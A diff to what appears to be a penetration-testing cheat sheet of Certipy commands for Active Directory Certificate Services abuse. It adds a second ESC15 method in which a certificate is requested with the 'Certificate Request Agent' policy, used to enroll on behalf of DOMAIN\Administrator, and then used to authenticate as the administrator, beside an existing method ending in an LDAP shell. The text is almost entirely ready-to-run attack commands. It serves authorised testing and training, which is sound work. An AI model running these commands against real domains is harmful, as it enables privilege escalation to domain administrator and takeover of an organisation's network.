@@ -153,12 +153,23 @@ certipy account update -u owned_user -p password -user username -upn username@do
 certipy auth -pfx pfx -dc-ip ip -user target -domain domain
 ```
 ## ESC15
+Method 1
 ```
 certipy req -u username@domain -p password -dc-ip ip -target dc -ca ca -template template -upn administrator@domain -sid <administrator sid> -application-policies 'Client Authentication'
 ```
 
 ```
 certipy auth -pfx administrator.pfx -dc-ip ip -ldap-shell
+```
+Method 2
+```
+certipy req -u username@domain -p password -dc-ip ip -ca ca -template WebServer -application-policies 'Certificate Request Agent'
+```
+```
+certipy req -u username@domain -p password -dc-ip ip -ca ca -template User -pfx user.pfx -on-behalf-of 'DOMAIN\Administrator'
+```
+```
+certipy auth -pfx administrator.pfx -dc-ip ip
 ```
 ## ESC16
 We use a user that has GenericAll or GenericWrite
